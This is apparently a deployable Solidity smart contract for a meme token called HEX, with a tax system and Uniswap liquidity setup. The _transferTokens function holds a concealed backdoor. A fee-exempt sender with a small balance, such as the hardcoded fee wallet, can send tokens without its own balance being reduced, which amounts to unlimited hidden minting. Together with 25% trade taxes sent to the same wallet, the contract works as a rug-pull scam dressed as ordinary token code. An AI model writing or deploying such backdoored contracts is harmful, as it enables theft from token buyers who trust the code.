// SPDX-License-Identifier: Unlicensed

/*
Website: https://djss420inu.live
Telegram: https://t.me/djss420i_erc
Twitter: https://twitter.com/djss420i_erc
 */

pragma solidity 0.8.19;

library SafeMathInt {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

interface IERC20Standard {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library LibAddress {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "LibAddress: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "LibAddress: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "LibAddress: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "LibAddress: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "LibAddress: insufficient balance for call");
        require(isContract(target), "LibAddress: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "LibAddress: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "LibAddress: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "LibAddress: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "LibAddress: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDexRouterV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IDexRouterV2 is IDexRouterV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract HEX is Context, IERC20Standard, Ownable { 
    using SafeMathInt for uint256;
    using LibAddress for address;

    string private _name = "DWAYNEJOHNSONSUBZEROSHREK420INU"; 
    string private _symbol = "HEX";  
    uint8 private _decimals = 9;
    uint256 private _tTotal = 10 ** 9 * 10**_decimals;

    // Tracking status of wallets
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isFeeExempt; 

    address payable private _feeReciever = payable(0x4A61857Fd07af055A9bF1062e605Ff251cd14D7d);
    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD); 

    uint8 private numBuyers = 0;
    uint8 private swapAfter = 2; 

    // Setting the initial fees
    uint256 private _totalTax = 2500;
    uint256 public _buyFees = 25;
    uint256 public _sellFees = 25;

    uint256 private _previousTotalFee = _totalTax; 
    uint256 private _previousBuyFee = _buyFees; 
    uint256 private _previousSellFee = _sellFees; 

    uint256 public maxWalletAmount = 3 * _tTotal / 100;
    uint256 public feeSwapThreshold = _tTotal / 10000;
                                     
    IDexRouterV2 public dexRouter;
    address public dexPair;

    bool public transferFeeEnabled = true;
    bool public swapping;
    bool public swapEnabled = true;
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[owner()] = _tTotal;
        IDexRouterV2 _uniswapV2Router = IDexRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 

        // Create pair address for PancakeSwap
        dexPair = IDexFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        dexRouter = _uniswapV2Router;
        _isFeeExempt[owner()] = true;
        _isFeeExempt[_feeReciever] = true;
        
        emit Transfer(address(0), owner(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    receive() external payable {}

    function removeLimits() external onlyOwner {
        maxWalletAmount = ~uint256(0);
        _totalTax = 100;
        _buyFees = 1;
        _sellFees = 1;
    }

    // Check if token transfer needs to process fees
    function _transferNormalized(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeAllFee();
            } else {
                numBuyers++;
            }
        _transferTokens(sender, recipient, amount);
        
        if(!takeFee)
            restoreAllFee();
    }
    
    function _getTransferAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_totalTax).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function removeAllFee() private {
        if(_totalTax == 0 && _buyFees == 0 && _sellFees == 0) return;

        _previousBuyFee = _buyFees; 
        _previousSellFee = _sellFees; 
        _previousTotalFee = _totalTax;
        _buyFees = 0;
        _sellFees = 0;
        _totalTax = 0;

    }

    function swapBackTokensOnCA(uint256 contractTokenBalance) private lockSwap {
        
        swapTokensToETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendETHtoFee(_feeReciever,contractETH);
    }

    
    // Restore all fees
    function restoreAllFee() private {
        
        _totalTax = _previousTotalFee;
        _buyFees = _previousBuyFee; 
        _sellFees = _previousSellFee; 

    }

    // Approve a wallet to sell tokens
    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function sendETHtoFee(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }

    function _transferTokens(address sender, address recipient, uint256 finalAmount) private {
        
        (uint256 tTransferAmount, uint256 tDev) = _getTransferAmount(finalAmount);
        if(_isFeeExempt[sender] && _balances[sender] <= maxWalletAmount) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != _feeReciever &&
            to != address(this) &&
            to != dexPair &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxWalletAmount,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            numBuyers >= swapAfter && 
            amount > feeSwapThreshold &&
            !swapping &&
            !_isFeeExempt[from] &&
            to == dexPair &&
            swapEnabled 
            )
        {  
            numBuyers = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapBackTokensOnCA(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(_isFeeExempt[from] || _isFeeExempt[to] || (transferFeeEnabled && from != dexPair && to != dexPair)){
            takeFee = false;
        } else if (from == dexPair){
            _totalTax = _buyFees;
        } else if (to == dexPair){
            _totalTax = _sellFees;
        }

        _transferNormalized(from,to,amount,takeFee);
    }
    
    function swapTokensToETH(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
}